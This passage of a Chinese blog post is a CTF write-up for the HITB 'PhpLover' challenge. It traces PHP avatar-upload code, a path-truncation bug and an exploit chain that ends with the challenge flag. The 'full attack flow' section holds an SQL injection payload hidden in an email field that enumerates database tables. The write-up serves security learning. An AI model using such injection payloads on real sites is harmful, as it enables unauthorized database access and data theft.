+<p>跟踪getavatar()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getavatar</span><span class="params">($raw=<span class="number">0</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;islogin)&#123;</span><br><span class="line">            $r=<span class="keyword">$this</span>-&gt;db-&gt;One(<span class="string">"avatar"</span>,<span class="keyword">array</span>(<span class="string">"user_id"</span>=&gt;<span class="keyword">$this</span>-&gt;id),<span class="keyword">array</span>(<span class="string">"*"</span>));</span><br><span class="line">            <span class="keyword">if</span>($raw==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>($r)&#123;</span><br><span class="line">                    <span class="keyword">if</span>($r[<span class="number">1</span>]) <span class="keyword">return</span> $r;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        $r[<span class="number">1</span>]=file_get_contents($r[<span class="number">3</span>]);</span><br><span class="line">                        <span class="keyword">return</span> $r;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">''</span>,file_get_contents(<span class="string">"uploads/0.jpg"</span>),<span class="keyword">$this</span>-&gt;id,<span class="string">"uploads/0.jpg"</span>,<span class="string">'image/jpeg'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>($r)&#123;</span><br><span class="line">                <span class="keyword">if</span>($r[<span class="number">1</span>]) <span class="keyword">return</span> <span class="string">"data:"</span>.$r[<span class="number">4</span>].<span class="string">";"</span>.base64_encode($r[<span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">"/"</span>.$r[<span class="number">3</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">"/uploads/0.jpg"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    	<span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>我们注意到关键操作<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$r=<span class="keyword">$this</span>-&gt;db-&gt;One(<span class="string">"avatar"</span>,<span class="keyword">array</span>(<span class="string">"user_id"</span>=&gt;<span class="keyword">$this</span>-&gt;id),<span class="keyword">array</span>(<span class="string">"*"</span>));</span><br><span class="line"><span class="keyword">if</span>($r)&#123;</span><br><span class="line">        <span class="keyword">if</span>($r[<span class="number">1</span>]) <span class="keyword">return</span> <span class="string">"data:"</span>.$r[<span class="number">4</span>].<span class="string">";"</span>.base64_encode($r[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">"/"</span>.$r[<span class="number">3</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>我们注意到数组$r，此时看一下数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE IF NOT EXISTS `avatar` (</span><br><span class="line">    `id` int(32) primary key auto_increment,</span><br><span class="line">    `data` blob,</span><br><span class="line">    `user_id` int(32) UNIQUE KEY,</span><br><span class="line">    `filepath` varchar(300),</span><br><span class="line">    `photo_type` varchar(20)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
+<p>可以发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$r[1]:data</span><br><span class="line">$r[3]:filepath</span><br></pre></td></tr></table></figure></p>
+<p>如果我们的上传图片有数据，就返回Base64后的数据，否则返回路径<br>我们跟踪一下路径的来源<br>我们注意到edit的上传功能中有<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$filename=<span class="string">"uploads/"</span>.<span class="keyword">$this</span>-&gt;user-&gt;getuser().<span class="string">"."</span>.$type;</span><br><span class="line"><span class="keyword">if</span>(is_uploaded_file($_FILES[<span class="string">'avatar'</span>][<span class="string">'tmp_name'</span>]))&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;user-&gt;edit(<span class="string">"avatar"</span>,<span class="keyword">array</span>($filename,$type));</span><br></pre></td></tr></table></figure></p>
+<p>跟进edit()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($feild==<span class="string">"avatar"</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;db-&gt;Insert(<span class="string">"avatar"</span>,<span class="keyword">array</span>(<span class="string">"''"</span>,<span class="keyword">$this</span>-&gt;id,<span class="string">"'$value[0]'"</span>,<span class="string">"'$value[1]'"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>即avatar表的filepath字段为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uploads/<span class="string">".$this-&gt;user-&gt;getuser()."</span>.<span class="string">".$type</span></span><br></pre></td></tr></table></figure></p>
+<p>即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uploads/用户名.文件mine</span><br></pre></td></tr></table></figure></p>
+<p>那么问题来了<br>我们看到数据库结构中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE IF NOT EXISTS `users` (</span><br><span class="line">  `id` int(32) primary key auto_increment,</span><br><span class="line">  `username` varchar(300) UNIQUE KEY,</span><br><span class="line">  .....</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
+<p>用户名的长度是300，而路径长度<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`filepath` varchar(300),</span><br></pre></td></tr></table></figure></p>
+<p>同为300，这就可以触发错误<br>如果我们的用户名长度为300<br>此时插入的路径就会被300截断，而变成一个不存在的路径<br>此时即可触发<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_exists($avatar)</span><br></pre></td></tr></table></figure></p>
+<p>错误<br>故此成功Bypass这个if判断</p>
+<h2 id="完整攻击流程"><a href="#完整攻击流程" class="headerlink" title="完整攻击流程"></a>完整攻击流程</h2><p>先随便注册个用户，看一下自己的id<br>然后再迅速注册用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username =</span><br><span class="line">skyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskyskysky</span><br><span class="line">email = </span><br><span class="line">&quot;&apos;, 233), (id+1, (SELECT group_concat(TABLE_NAME) FROM/**/ information_schema.TABLES where TABLE_SCHEMA=database()), 23333)#&quot;@skysec.top</span><br></pre></td></tr></table></figure></p>
+<p>验证id是否是自己预想的id+1<br>登录后触发上传功能<br>上传空文件，抓包改mine<br>触发export功能<br>即可完成攻击，发现注入成功后的数据<br>最后得到flag表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE IF NOT EXISTS `fffflag_is_here` (</span><br><span class="line">    `id` int(32) primary key auto_increment,</span><br><span class="line">    `fllllag_is_hhhhere` varchar(300),</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
+<p>以及数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HITB&#123;2e9ular131mp0rt4nt&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>个人认为题目思路可以，Orz出题人大哥~</p>
+
+    </article>
+    <!-- 前后页  -->
+    <ul class="post-pager">
+        
+            <li class="next">
+                <a href= "/2018/04/21/流量分析-CTF题目实战/" title= 流量分析-CTF题目实战 >
+                    <span>Next Post</span>
+                    <span>流量分析-CTF题目实战</span>
+                </a>
+            </li>
+        
+        
+            <li class="previous">
+                <a href= "/2018/04/15/Long-Ago-AWD-Flasky/" title= Long-Ago-AWD-Flasky >
+                    <span>Previous Post</span>
+                    <span>Long-Ago-AWD-Flasky</span>
+                </a>
+            </li>
+        
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC版-->
+
+    <!--PC版-->
+
+
+    
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:136244588@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/skyofkinglove" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title="rss"></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">Theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+        <span id="busuanzi_container_site_pv" style="color:black;font-size:14px">VISITOR VOLUME: <span id="busuanzi_value_site_pv"></span>
+        </span>
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper">
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前记"><span class="toc-number">1.</span> <span class="toc-text">前记</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#代码结构"><span class="toc-number">2.</span> <span class="toc-text">代码结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#代码分析"><span class="toc-number">3.</span> <span class="toc-text">代码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#login"><span class="toc-number">3.1.</span> <span class="toc-text">login</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#register"><span class="toc-number">3.2.</span> <span class="toc-text">register</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#add-view"><span class="toc-number">4.</span> <span class="toc-text">add/view</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#edit"><span class="toc-number">5.</span> <span class="toc-text">edit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#export"><span class="toc-number">6.</span> <span class="toc-text">export</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击点思考"><span class="toc-number">7.</span> <span class="toc-text">攻击点思考</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#解决问题1-id"><span class="toc-number">7.1.</span> <span class="toc-text">解决问题1-id</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解决问题2-if-false"><span class="toc-number">7.2.</span> <span class="toc-text">解决问题2-if_false</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#完整攻击流程"><span class="toc-number">8.</span> <span class="toc-text">完整攻击流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后记"><span class="toc-number">9.</span> <span class="toc-text">后记</span></a></li></ol>
+    </div>
+    
+    <div class="back-top">&#xe639;</div>
+    <div class="sidebar">
+    <div class="sidebar-header sidebar-header-show-archive">
+        <div class="sidebar-category">
+            <span class="sidebar-archive-link"><span class="iconfont-archer">&#xe67d;</span>Archive</span>
+            <span class="sidebar-tags-link"><span class="iconfont-archer">&#xe610;</span>Tag</span>
+        </div>
+    </div>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-archive">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-archive"> Total : 109 </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/31</span><a class="archive-post-title" href= "/2018/05/31/2018.5.18信息安全铁人三项赛数据赛题解/" >2018.5.18信息安全铁人三项赛数据赛题解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/30</span><a class="archive-post-title" href= "/2018/05/30/2018.5.5信息安全铁人三项赛数据赛题解/" >2017-2018赛季信息安全铁人三项赛全国第三赛区数据赛题解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/27</span><a class="archive-post-title" href= "/2018/05/27/2018RedHat-AD-Web/" >2018RedHat-AD-Web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/19</span><a class="archive-post-title" href= "/2018/05/19/Json-Web-Token历险记/" >Json Web Token历险记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/19</span><a class="archive-post-title" href= "/2018/05/19/2018CUMTCTF-Final-Web/" >2018CUMTCTF-Final-Web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/12</span><a class="archive-post-title" href= "/2018/05/12/2018年第四届全国网络空间安全技术大赛/" >2018年第四届全国网络空间安全技术大赛</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/01</span><a class="archive-post-title" href= "/2018/05/01/2018-RedHat-Web-Misc/" >2018-RedHat-Web_Misc</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/27</span><a class="archive-post-title" href= "/2018/04/27/线下AD-代码审计-ECShop-V2-7-3/" >线下AD&代码审计&ECShop V2.7.3</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/22</span><a class="archive-post-title" href= "/2018/04/22/DDCTF-bitcoin-51per-Attack/" >DDCTF-bitcoin-51%Attack</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/21</span><a class="archive-post-title" href= "/2018/04/21/流量分析-CTF题目实战/" >流量分析-CTF题目实战</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/21</span><a class="archive-post-title" href= "/2018/04/21/数据分析-企业渗透过程/" >数据分析-企业渗透过程</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/16</span><a class="archive-post-title" href= "/2018/04/16/2018-XCTF-HITB-PhpLover/" >2018-XCTF-HITB-PhpLover</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/15</span><a class="archive-post-title" href= "/2018/04/15/Long-Ago-AWD-Flasky/" >Long-Ago-AWD-Flasky</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/13</span><a class="archive-post-title" href= "/2018/04/13/2018-XCTF-HITB-WEB/" >2018-XCTF-HITB-WEB</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/11</span><a class="archive-post-title" href= "/2018/04/11/0ctf-ezdoor/" >0ctf-ezdoor</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/04</span><a class="archive-post-title" href= "/2018/04/04/pwnhub-time-injection带来的新思路/" >pwnhub time injection带来的新思路</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/04</span><a class="archive-post-title" href= "/2018/04/04/amazing-phpinfo/" >amazing phpinfo()</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/01</span><a class="archive-post-title" href= "/2018/04/01/Python-is-the-best-language/" >Python is the best language</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/23</span><a class="archive-post-title" href= "/2018/03/23/从sql注入到xslt再到xxe的一道ctf题目/" >从sql注入到xslt再到xxe的一道ctf题目</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/21</span><a class="archive-post-title" href= "/2018/03/21/从一道题深入mysql字符集与比对方法collation/" >从一道题深入mysql字符集与比对方法collation</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/15</span><a class="archive-post-title" href= "/2018/03/15/solveme-peng-kr-web/" >solveme.peng.kr-web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/15</span><a class="archive-post-title" href= "/2018/03/15/Some trick in ssrf and unserialize()/" >Some trick in ssrf and unserialize()</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
